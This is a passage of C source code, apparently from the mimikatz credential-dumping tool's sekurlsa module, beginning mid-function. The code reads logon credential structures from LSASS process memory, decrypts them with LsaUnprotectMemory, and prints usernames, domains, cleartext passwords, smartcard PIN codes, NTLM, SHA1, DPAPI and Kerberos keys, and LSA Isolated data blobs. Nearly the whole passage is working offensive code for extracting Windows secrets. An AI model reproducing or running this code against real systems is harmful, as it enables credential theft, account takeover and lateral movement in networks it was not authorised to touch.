								msvCredentials += LM_NTLM_HASH_LENGTH + sizeof(DWORD);
							}
							
							if((i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 2*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH)) ||
								i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 3*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH))
								kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
							else
								kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)), i);
						}
						break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
					if(kull_m_rpc_DecodeCredentialKeys(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, &pKeys))
					{
						for(i = 0; i < pKeys->count; i++)
							kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[i], sid);
						kull_m_rpc_FreeCredentialKeys(&pKeys);
					}
					break;
				default:
					kprintf(L"\n\t * Raw data : ");
					kull_m_string_wprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
		{
			kprintf(L"\n\t * Smartcard"); 
			if(mesCreds->UserName.Buffer)
			{
				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
					kprintf(L"\n\t     PIN code : %wZ", &mesCreds->UserName);
					LocalFree(mesCreds->UserName.Buffer);
				}
			}
			if(mesCreds->Domaine.Buffer)
			{
				kprintf(
					L"\n\t     Card     : %s"
					L"\n\t     Reader   : %s"
					L"\n\t     Container: %s"
					L"\n\t     Provider : %s",
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[0],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[1],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[2],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[3]
					);
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
			kprintf(L"\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
			{
				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
				if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
				{
					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (ULONG) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
					{
						if(pHashPassword->Size <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
							kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer);
						else
							kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) buffer.Buffer, (DWORD) pHashPassword->Size);
					}
					else
					{
						if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
							(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
						kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
					}
					LocalFree(buffer.Buffer);
				}
			}
			else kprintf(L"<no size, buffer is incorrect>");
			kprintf(L"\n");
		}
		else
		{
			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
			{
				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
				{
				case 1:
					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
					mesCreds->Password.Buffer = NULL;
					buffer.Length = buffer.MaximumLength = (USHORT) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.StructSize;
					buffer.Buffer = (PWSTR) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.isoBlob;
					if(kull_m_process_getUnicodeString(&buffer, cLsass.hLsassMem))
						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
					//break;
				case 0:
					// no creds
					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
					mesCreds->Password.Buffer = NULL;
					break;
				case 2:
					mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
					break;
				default:
					PRINT_ERROR(L"Unknown version in Kerberos credentials structure\n");
				}
			}
			
			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_process_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_process_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					kprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						L"%wZ\t%wZ\t"
						:
						L"\n\t * Username : %wZ"
						L"\n\t * Domain   : %wZ"
						L"\n\t * Password : "
						, username, domain);

					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
						else
							kprintf(L"%wZ", password);
					}
					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);

					if(blob)
					{
						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
						LocalFree(blob);
					}
				}

				if(username)
					LocalFree(username->Buffer);
				if(domain)
					LocalFree(domain->Buffer);
				if(password)
					LocalFree(password->Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			kprintf(L"\n");

		if(sid)
			LocalFree(sid);
	}
	else kprintf(L"LUID KO\n");
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key, LPCWSTR sid)
{
	if(key && key->cbData)
	{
		switch(key->type)
		{
		case CREDENTIALS_KEY_TYPE_NTLM:
			kprintf(L"\n\t * NTLM     : ");
			if(sid)
				kuhl_m_dpapi_oe_credential_add(sid, NULL, key->pbData, NULL, NULL, NULL);
			break;
		case CREDENTIALS_KEY_TYPE_SHA1:
			kprintf(L"\n\t * SHA1     : ");
			if(sid)
				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, key->pbData, NULL, NULL);
			break;
		case CREDENTIALS_KEY_TYPE_ROOTKEY:
			kprintf(L"\n\t * RootKey  : ");
			break;
		case CREDENTIALS_KEY_TYPE_DPAPI_PROTECTION:
			kprintf(L"\n\t * DPAPI    : ");
			if(sid)
				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, NULL, key->pbData, NULL);
			break;
		default:
			kprintf(L"\n\t * %08x : ", key->type);
		}
		kull_m_string_wprintf_hex(key->pbData, key->cbData, 0);
	}
}

VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
{
	kprintf(L"\n\t   * LSA Isolated Data: %.*S", blob->typeSize, blob->data);
	kprintf(L"\n\t     Unk-Key  : "); kull_m_string_wprintf_hex(blob->unkKeyData, sizeof(blob->unkKeyData), 0);
	kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
	kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
	kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
	kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); kprintf(L", 5:0x%x", blob->unk5);
}

VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(PENC_LSAISO_DATA_BLOB blob, DWORD size)
{
	kprintf(L"\n\t   * unkData1 : "); kull_m_string_wprintf_hex(blob->unkData1, sizeof(blob->unkData1), 0);
	kprintf(L"\n\t     unkData2 : "); kull_m_string_wprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0);
	kprintf(L"\n\t     Encrypted: "); kull_m_string_wprintf_hex(blob->data, size - FIELD_OFFSET(ENC_LSAISO_DATA_BLOB, data), 0);
}